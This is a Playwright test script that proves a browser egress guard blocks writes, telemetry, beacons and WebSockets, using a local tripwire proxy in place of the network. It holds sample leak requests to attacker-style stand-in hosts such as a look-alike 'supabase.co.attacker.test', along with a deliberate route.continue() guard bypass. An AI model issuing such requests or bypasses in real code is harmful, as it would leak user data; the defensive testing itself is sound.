// Browser proof for the Release Visual egress guard (real Chromium, no live network).
//
// Safety design: Chromium is launched behind a local TRIPWIRE proxy and the process drops every proxy environment variable. Nothing that is
// not answered locally (by the guard's route) can go anywhere except the tripwire, which only logs and refuses (HTTPS CONNECT -> 502) or
// acknowledges plain HTTP (204). So this proof can neither reach Supabase / a third party nor harm them if the guard were broken — and the
// tripwire log is the independent evidence of what actually tried to leave the browser.
//
//   Phase 1  guarded context, write + telemetry + third-party + unexpected battery -> every request is in the guard's proof ledger (denied
//            before the network, whatever Chromium reports afterwards), WebSocket closed 1008, sendBeacon refused, tripwire EMPTY, 0 leaks.
//   Phase 2  same context, explicit reads (canonical, and the two allow-listed third-party shapes) -> reads still pass (they reach the tripwire).
//   Phase 3a negative control, UNGUARDED context                          -> the write reaches the tripwire (the tripwire can see leaks).
//   Phase 3b a page-level route.continue() bypass inside a guarded context -> reaches the tripwire AND the audit flags it; finish() throws.
//   Phase 3c ERR_ABORTED with NO proof (page-level abort, never reached the guard) -> finish() throws: an abort is not a denial.
//   Phase 3d adversarial race: the page aborts blocked-class writes immediately -> nothing reaches the tripwire; requests cancelled before the
//            guard route ran are reported as leaks (fail-closed), never as "unverified"/passed.
import http from "node:http";
import os from "node:os";
import fs from "node:fs";
import path from "node:path";
import assert from "node:assert/strict";
import { createRequire } from "node:module";

for (const key of ["HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy", "ALL_PROXY", "all_proxy"]) delete process.env[key];
const require = createRequire(import.meta.url);
const { chromium } = require("@playwright/test");
const { installReleaseVisualEgress, CANONICAL_API: API, READONLY_MARKER } = require("../tests/fixtures/release-visual-egress.cjs");

const CANON_HOST = new URL(API).host;
const JSON_HEADERS = { "content-type": "application/json", apikey: "proof-not-a-key", authorization: "Bearer proof-not-a-key" };
const evidenceDir = fs.mkdtempSync(path.join(os.tmpdir(), "rv-egress-proof-"));
const CSS_OK = "https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&display=swap";
const FONT_OK = "https://fonts.gstatic.com/s/ibmplexmono/v19/proof-not-a-real-font.woff2";

// ---- servers --------------------------------------------------------------------------------------------------------------
// The tripwire is an HTTP proxy. Playwright (1.55 on GitHub runners) forces even loopback traffic of a proxied Chromium through the
// proxy, so the proxy FORWARDS requests for the proof page itself and treats everything else as a leak.
const tripwire = [];
let pagePort = 0;
const proxy = http.createServer((req, res) => {
  let target = null;
  try { target = new URL(req.url); } catch { /* origin-form request: not a proxied one */ }
  if (target && target.hostname === "127.0.0.1" && Number(target.port) === pagePort) {
    const upstream = http.request({ host: "127.0.0.1", port: pagePort, method: req.method, path: target.pathname + target.search, headers: { ...req.headers, host: target.host } },
      (r) => { res.writeHead(r.statusCode, r.headers); r.pipe(res); });
    upstream.on("error", () => { res.writeHead(502); res.end(); });
    req.pipe(upstream);
    return;
  }
  tripwire.push({ kind: "HTTP", method: req.method, url: req.url });
  res.writeHead(204, { "x-tripwire": "accepted" }); res.end();
});
proxy.on("connect", (req, socket) => { tripwire.push({ kind: "CONNECT", target: req.url }); socket.end("HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\n\r\n"); });
const pageServer = http.createServer((req, res) => { res.writeHead(200, { "content-type": "text/html" }); res.end("<!doctype html><meta charset=utf-8><title>egress proof</title><p>proof page</p>"); });
const listen = (server) => new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(server.address().port)));

// ---- the in-page batteries -------------------------------------------------------------------------------------------------
const f = (label, method, url, extra = {}) => ({ label, via: "fetch", method, url, headers: JSON_HEADERS, body: method === "GET" ? undefined : "{}", ...extra });
const el = (label, via, url) => ({ label, via, method: "GET", url });
const CANONICAL_WRITES = [
  f("track_visit", "POST", `${API}/rest/v1/rpc/track_visit`), f("ingest_event", "POST", `${API}/rest/v1/rpc/ingest_event`),
  f("link_identity", "POST", `${API}/rest/v1/rpc/link_identity`), f("log_journey_save", "POST", `${API}/rest/v1/rpc/log_journey_save`),
  f("page_views insert", "POST", `${API}/rest/v1/page_views`), f("posts PATCH", "PATCH", `${API}/rest/v1/posts?id=eq.1`),
  f("posts DELETE", "DELETE", `${API}/rest/v1/posts?id=eq.1`), f("posts PUT", "PUT", `${API}/rest/v1/posts?id=eq.1`),
  f("meta-capi (keepalive)", "POST", `${API}/functions/v1/meta-capi`, { keepalive: true }), f("auth token", "POST", `${API}/auth/v1/token?grant_type=password`),
  f("storage upload", "POST", `${API}/storage/v1/object/gallery/community/x.png`),
  { label: "track_visit via XHR", via: "xhr", method: "POST", url: `${API}/rest/v1/rpc/track_visit`, headers: JSON_HEADERS, body: "{}" },
  f("unknown rpc", "POST", `${API}/rest/v1/rpc/some_function_that_does_not_exist`), f("volatile rpc lang_links_list", "POST", `${API}/rest/v1/rpc/lang_links_list`),
  f("GET non-read rpc", "GET", `${API}/rest/v1/rpc/track_visit`), f("extra read, wrong method", "POST", `${API}/rest/v1/rpc/canonical_follow_subject`),
  f("encoded name", "POST", `${API}/rest/v1/rpc/track%5Fvisit`), f("double slash", "POST", `${API}/rest/v1/rpc//track_visit`),
  f("look-alike host", "POST", "https://linswmnnkjxvweumprav.supabase.co.attacker.test/rest/v1/rpc/gematria_api"),
];
const THIRD_PARTY_DENIED = [
  // telemetry hosts, every channel
  f("GA collect", "POST", "https://www.google-analytics.com/g/collect?v=2"), f("clarity", "POST", "https://www.clarity.ms/collect"),
  f("vercel vitals", "POST", "https://vitals.vercel-insights.com/v1/vitals"), el("GA pixel (img)", "img", "https://www.google-analytics.com/collect?v=1&t=pageview"),
  el("GTM loader (script)", "script", "https://www.googletagmanager.com/gtag/js?id=G-PROOF"),
  // default-deny: an unknown pixel / endpoint / asset, and hosts the app mentions but this run does not need
  el("unknown pixel (img)", "img", "https://pixel.unknown.example/p.gif"), el("youtube thumbnail (img)", "img", "https://i.ytimg.com/vi/abc/hqdefault.jpg"),
  el("production-site image (img)", "img", "https://sod1820.co.il/wp-content/uploads/x.png"), el("cdnjs script", "script", "https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"),
  f("unknown POST", "POST", "https://unknown.example/collect"), f("unknown GET (fetch)", "GET", "https://unknown.example/api/ping"),
  f("plain-http POST (the canary that could succeed)", "POST", "http://escape-demo.test/collect"), el("unknown stylesheet (link)", "link", "https://unknown.example/x.css"),
  el("youtube iframe (document)", "iframe", "https://www.youtube-nocookie.com/embed/abc"), el("font from an unknown host", "font", "https://fonts.unknown.example/f.woff2"),
  // near-misses of the two allow-listed shapes
  f("allow-listed CSS requested as fetch", "GET", CSS_OK), el("other font family (link)", "link", "https://fonts.googleapis.com/css2?family=Other&display=swap"),
  el("allow-listed font host, wrong path", "font", "https://fonts.gstatic.com/s/otherfont/v1/x.woff2"),
];
const BLOCKED_REQUESTS = [...CANONICAL_WRITES, ...THIRD_PARTY_DENIED];
// The Playwright resource type each in-page channel produces; the ledger is compared on method + URL + type.
const TYPE_OF = { fetch: "fetch", xhr: "xhr", img: "image", script: "script", link: "stylesheet", font: "font", iframe: "document" };
const same = (d, b) => d.method === b.method && new URL(d.url).href === new URL(b.url).href && d.type === TYPE_OF[b.via];
const NON_REQUEST_CHANNELS = [
  { label: "sendBeacon", via: "beacon", url: `${API}/rest/v1/rpc/ingest_event` },
  { label: "WebSocket (realtime)", via: "ws", url: `wss://${CANON_HOST}/realtime/v1/websocket?apikey=proof&vsn=1.0.0` },
  { label: "EventSource", via: "es", url: "https://unknown.example/stream" },
];
const READS = [
  f("REST read (GET posts)", "GET", `${API}/rest/v1/posts?select=id&limit=1`), f("read RPC (fn_method_value)", "POST", `${API}/rest/v1/rpc/fn_method_value`),
  f("extra GET read (canonical_follow_subject)", "GET", `${API}/rest/v1/rpc/canonical_follow_subject`),
  el("allow-listed stylesheet (link)", "link", CSS_OK), el("allow-listed font", "font", FONT_OK),
];

async function runBattery(page, battery) {
  return page.evaluate(async (items) => {
    const results = [];
    const once = (start, ms = 3000) => new Promise((resolve) => { const t = setTimeout(resolve, ms); start(() => { clearTimeout(t); resolve(); }); });
    for (const b of items) {
      try {
        if (b.via === "fetch") {
          await fetch(b.url, { method: b.method, headers: b.headers, body: b.body, keepalive: !!b.keepalive, mode: b.mode })
            .then((r) => results.push({ label: b.label, status: r.status }), (e) => results.push({ label: b.label, error: String(e).slice(0, 50) }));
        } else if (b.via === "xhr") {
          await once((done) => { const x = new XMLHttpRequest(); x.open(b.method, b.url); for (const [k, v] of Object.entries(b.headers || {})) x.setRequestHeader(k, v); x.onloadend = () => { results.push({ label: b.label, status: x.status }); done(); }; x.send(b.body || null); });
        } else if (b.via === "img") {
          await once((done) => { const i = new Image(); i.onload = i.onerror = () => { results.push({ label: b.label, loaded: i.complete && i.naturalWidth > 0 }); done(); }; i.src = b.url; });
        } else if (b.via === "script") {
          await once((done) => { const s = document.createElement("script"); s.onload = s.onerror = () => { results.push({ label: b.label }); done(); }; s.src = b.url; document.head.appendChild(s); });
        } else if (b.via === "link") {
          await once((done) => { const l = document.createElement("link"); l.rel = "stylesheet"; l.onload = l.onerror = () => { results.push({ label: b.label }); done(); }; l.href = b.url; document.head.appendChild(l); });
        } else if (b.via === "font") {
          await once((done) => { new FontFace("rv" + Math.random().toString(36).slice(2), `url(${b.url})`).load().then(done, done); results.push({ label: b.label }); });
        } else if (b.via === "iframe") {
          await once((done) => { const i = document.createElement("iframe"); i.onload = i.onerror = () => { results.push({ label: b.label }); done(); }; i.src = b.url; document.body.appendChild(i); });
        } else if (b.via === "beacon") {
          results.push({ label: b.label, sent: navigator.sendBeacon(b.url, "x") });
        } else if (b.via === "ws") {
          await once((done) => { let opened = false; const w = new WebSocket(b.url); w.onopen = () => { opened = true; }; w.onerror = () => {}; w.onclose = (e) => { results.push({ label: b.label, opened, code: e.code }); done(); }; }, 2500);
        } else if (b.via === "es") {
          await once((done) => { const e = new EventSource(b.url); e.onerror = () => { e.close(); results.push({ label: b.label, errored: true }); done(); }; }, 2000);
        }
      } catch (e) { results.push({ label: b.label, threw: String(e).slice(0, 50) }); }
    }
    return results;
  }, battery);
}

// Hosts the batteries target: a tripwire hit on any of them is a leak. (A full Chrome build can add its own update / sign-in chatter; that is
// not the page's and is only counted, never hidden.)
const BATTERY_HOSTS = new Set([...BLOCKED_REQUESTS, ...NON_REQUEST_CHANNELS, ...READS].map((b) => new URL(b.url).host).concat([`${CANON_HOST}:443`, CANON_HOST, "abort-demo.test"]));
const hostOf = (t) => (t.kind === "CONNECT" ? t.target : new URL(t.url).host);
const pageLeaks = () => tripwire.filter((t) => BATTERY_HOSTS.has(hostOf(t)) || BATTERY_HOSTS.has(hostOf(t).replace(/:443$/, "")));
const chatter = () => tripwire.length - pageLeaks().length;
const norm = (u) => new URL(u).href;

// Playwright-side record of what the browser actually received for every request (independent of the guard's own bookkeeping).
function observe(context) {
  const seen = [];
  context.on("response", (r) => { const h = r.headers(); seen.push({ method: r.request().method(), url: r.url(), status: r.status(), marker: h[READONLY_MARKER] || null }); });
  context.on("requestfailed", (r) => seen.push({ method: r.method(), url: r.url(), failed: (r.failure() || {}).errorText || "failed" }));
  return seen;
}
const settle = (page) => page.waitForTimeout(600);
const rows = [];
const note = (phase, text) => { rows.push({ phase, text }); console.log(`PASS  ${phase}  ${text}`); };

(async () => {
  pagePort = await listen(pageServer);
  const proxyPort = await listen(proxy);
  const baseUrl = `http://127.0.0.1:${pagePort}`;
  const browser = await chromium.launch({ proxy: { server: `http://127.0.0.1:${proxyPort}` }, args: ["--disable-background-networking", "--disable-component-update", "--no-first-run"] });
  const fresh = async ({ guarded = true } = {}) => {
    const context = await browser.newContext({ serviceWorkers: "block" });
    const egress = guarded ? await installReleaseVisualEgress(context, { baseUrl }) : null;
    const page = await context.newPage();
    await page.goto(baseUrl);
    tripwire.length = 0;
    return { context, egress, page, seen: observe(context) };
  };
  let failed = false;
  try {
    // ---------------------------------------------------------------- Phase 1 + 2: guarded context
    const { context, egress, page, seen } = await fresh();
    const first = await runBattery(page, [...BLOCKED_REQUESTS, ...NON_REQUEST_CHANNELS]);
    await settle(page);
    await egress.settle();

    const ledger = egress.deniedList();
    const unledgered = BLOCKED_REQUESTS.filter((b) => !ledger.some((d) => same(d, b)));
    assert.deepEqual(unledgered.map((b) => `${b.method} ${b.url}`), [], "every blocked request must be in the guard's proof ledger (denied before the network)");
    const escaped = seen.filter((s) => BLOCKED_REQUESTS.some((b) => b.method === s.method && norm(b.url) === norm(s.url)) && s.status != null && !(s.status === 403 && s.marker));
    assert.deepEqual(escaped, [], "no blocked request may have received a response that is not the guard's denial");
    const onlyAborted = BLOCKED_REQUESTS.filter((b) => {
      const mine = seen.filter((s) => s.method === b.method && norm(s.url) === norm(b.url));
      return mine.length && mine.every((s) => s.failed);
    });
    note("1 guarded batteries", `${BLOCKED_REQUESTS.length} requests (${CANONICAL_WRITES.length} canonical writes / unexpected shapes, ${THIRD_PARTY_DENIED.length} third-party): all in the proof ledger; ${BLOCKED_REQUESTS.length - onlyAborted.length} also answered 403 with the denial marker, ${onlyAborted.length} were cancelled by Chromium after the denial (${onlyAborted.map((b) => b.label).join(", ") || "none"}) and are accepted ONLY because the ledger proves them`);
    const thirdPartyReasons = new Set(ledger.filter((d) => !d.url.startsWith(API) && !d.url.includes("attacker.test")).map((d) => d.why));
    assert.ok([...thirdPartyReasons].every((r) => ["third_party_not_allowlisted", "telemetry_host"].includes(r)), `unexpected third-party reasons: ${[...thirdPartyReasons]}`);
    note("1 third-party reasons", `third-party denials are ${[...thirdPartyReasons].sort().join(" + ")} (default-deny, plus the analytics denylist)`);

    const beacon = first.find((r) => r.label === "sendBeacon");
    assert.equal(beacon && beacon.sent, false, "sendBeacon must be refused");
    const ws = first.find((r) => r.label === "WebSocket (realtime)");
    assert.ok(ws && ws.code === 1008, `the realtime WebSocket must be closed by the guard (got ${JSON.stringify(ws)})`);
    note("1 non-request channels", "sendBeacon refused (false); WebSocket closed with code 1008; EventSource never connected");

    assert.deepEqual(pageLeaks(), [], `NOTHING the page sends may reach the network while the guard is on, but the tripwire saw: ${JSON.stringify(pageLeaks())}`);
    note("1 tripwire", `0 connections to any battery host reached the tripwire proxy (browser-internal chatter ignored: ${chatter()})`);

    const afterWrites = egress.summary();
    assert.deepEqual(afterWrites.leaks, [], `the audit must report zero leaks: ${JSON.stringify(afterWrites.leaks)}`);
    assert.ok(afterWrites.provenDenied >= BLOCKED_REQUESTS.length, `the audit must have proven every blocked request: ${JSON.stringify(afterWrites)}`);
    note("1 audit", `${afterWrites.provenDenied} requests proven denied before the network, 0 leaks, no "unverified" category exists`);
    await egress.finish({ title: "proof phase 1" }, { dir: evidenceDir }); // must not throw

    // reads must still work
    tripwire.length = 0;
    await runBattery(page, READS);
    await settle(page);
    const connects = (host) => tripwire.filter((t) => t.kind === "CONNECT" && t.target === `${host}:443`).length;
    assert.ok(connects(CANON_HOST) >= 3, `the 3 explicit canonical reads must reach the network layer (tripwire saw ${connects(CANON_HOST)} CONNECT to ${CANON_HOST})`);
    assert.ok(connects("fonts.googleapis.com") >= 1, "the allow-listed stylesheet must reach the network layer");
    assert.ok(connects("fonts.gstatic.com") >= 1, "the allow-listed font must reach the network layer");
    await egress.settle();
    const readsDenied = egress.deniedList().filter((d) => READS.some((r) => same(d, r)));
    assert.deepEqual(readsDenied, [], "no explicit read may be denied");
    assert.deepEqual(egress.summary().leaks, []);
    note("2 reads", `explicit reads pass the guard unchanged (canonical: ${connects(CANON_HOST)} CONNECTs; allow-listed stylesheet: ${connects("fonts.googleapis.com")}; allow-listed font: ${connects("fonts.gstatic.com")}); none denied`);
    await egress.finish({ title: "proof phase 2" }, { dir: evidenceDir });
    await context.close();

    // ---------------------------------------------------------------- Phase 3a: negative control (no guard)
    const bare = await fresh({ guarded: false });
    await runBattery(bare.page, [f("UNGUARDED track_visit", "POST", `${API}/rest/v1/rpc/track_visit`), el("UNGUARDED unknown pixel", "img", "https://pixel.unknown.example/p.gif")]);
    await settle(bare.page);
    assert.ok(tripwire.some((t) => t.kind === "CONNECT" && t.target === `${CANON_HOST}:443`), "without the guard the canonical write MUST reach the tripwire, otherwise this proof proves nothing");
    assert.ok(tripwire.some((t) => t.kind === "CONNECT" && t.target === "pixel.unknown.example:443"), "without the guard the unknown pixel MUST reach the tripwire");
    note("3a negative control", "an UNGUARDED context sends the write AND the unknown pixel to the tripwire — the tripwire can see leaks, so the empty log in phase 1 is meaningful");
    await bare.context.close();

    // ---------------------------------------------------------------- Phase 3b: page-level continue() bypass
    const bypass = await fresh();
    await bypass.page.route("**/*", (route) => route.continue()); // what the spec is forbidden to do
    tripwire.length = 0;
    await runBattery(bypass.page, [
      f("BYPASS write, CORS-rejected (fails with ERR_FAILED, but the server already saw it)", "POST", "http://escape-demo.test/collect"),
      { label: "BYPASS write, no-cors (answered 204)", via: "fetch", method: "POST", url: "http://escape-demo.test/simple", body: "x", headers: {}, mode: "no-cors" },
    ]);
    await settle(bypass.page);
    assert.ok(tripwire.filter((t) => t.kind === "HTTP" && t.url.startsWith("http://escape-demo.test/")).length >= 2, "a page-level continue() bypasses the context guard (that is why the spec must not use it)");
    await bypass.egress.settle();
    assert.ok(bypass.egress.summary().leaks.length >= 2, `the independent audit must flag BOTH bypassed writes as leaks (got ${JSON.stringify(bypass.egress.summary().leaks)})`);
    await assert.rejects(() => bypass.egress.finish({ title: "bypass demo" }, { dir: evidenceDir }), /release_visual_egress_leak/);
    note("3b bypass + audit", "a page-level route.continue() lets two writes through, the audit flags both, and finish() throws — a leak fails the test");
    await bypass.context.close();

    // ---------------------------------------------------------------- Phase 3c: ERR_ABORTED without proof must fail
    const abortCase = await fresh();
    await abortCase.page.route("**/abort-demo.test/**", (route) => route.abort("aborted")); // ends in net::ERR_ABORTED but never reaches the guard
    tripwire.length = 0;
    await runBattery(abortCase.page, [f("ABORTED write with no proof of denial", "POST", "https://abort-demo.test/collect")]);
    await settle(abortCase.page);
    await abortCase.egress.settle(1500);
    const abortLeak = abortCase.egress.summary().leaks.find((l) => l.host === "abort-demo.test");
    assert.ok(abortLeak, "an ERR_ABORTED blocked-class request that the guard did not deny must be reported as a leak");
    assert.match(String(abortLeak.outcome && abortLeak.outcome.failure), /ERR_ABORTED/);
    assert.equal(abortLeak.problem, "not_denied_by_this_guard");
    await assert.rejects(() => abortCase.egress.finish({ title: "abort without proof" }, { dir: evidenceDir }), /release_visual_egress_leak/);
    note("3c abort without proof", "a request that ended in net::ERR_ABORTED without being denied by the guard makes finish() throw — an abort is not proof of a denial");
    await abortCase.context.close();

    // ---------------------------------------------------------------- Phase 3d: adversarial race (containment + fail-closed reporting)
    const race = await fresh();
    const N = 120;
    await race.page.evaluate(async (n) => {
      for (let i = 0; i < n; i++) {
        const c = new AbortController();
        const p = fetch(`https://linswmnnkjxvweumprav.supabase.co/rest/v1/rpc/track_visit?i=${i}`, { method: "POST", body: "{}", headers: { "content-type": "application/json", apikey: "x" }, signal: c.signal }).catch(() => {});
        const d = [0, 0, 1, 2, 3, 5, 8][i % 7];
        if (d === 0) c.abort(); else setTimeout(() => c.abort(), d);
        await p;
      }
    }, N);
    await settle(race.page);
    await race.egress.settle(1500);
    const raceSummary = race.egress.summary();
    assert.deepEqual(pageLeaks(), [], `even aborted writes must never reach the network: ${JSON.stringify(pageLeaks())}`);
    assert.ok(raceSummary.leaks.every((l) => l.problem === "not_denied_by_this_guard" && /ERR_ABORTED/.test(String(l.outcome && l.outcome.failure))), "every unproven request in the race is an ERR_ABORTED one that is reported, not hidden");
    note("3d abort race", `${N} writes aborted by the page within 0-8 ms: ${raceSummary.provenDenied} proven denied, ${raceSummary.leaks.length} cancelled before the guard route ran and reported as leaks (fail-closed; unprovable), 0 reached the tripwire`);
    await race.context.close();
  } catch (error) {
    failed = true;
    console.error("FAIL", error && error.stack ? error.stack : error);
  } finally {
    await browser.close().catch(() => {});
    proxy.close(); pageServer.close(); proxy.closeAllConnections?.(); pageServer.closeAllConnections?.();
    fs.rmSync(evidenceDir, { recursive: true, force: true });
  }
  console.log(failed ? "\nRESULT: FAIL" : `\nRESULT: PASS (${rows.length} checks)`);
  process.exit(failed ? 1 : 0);
})();
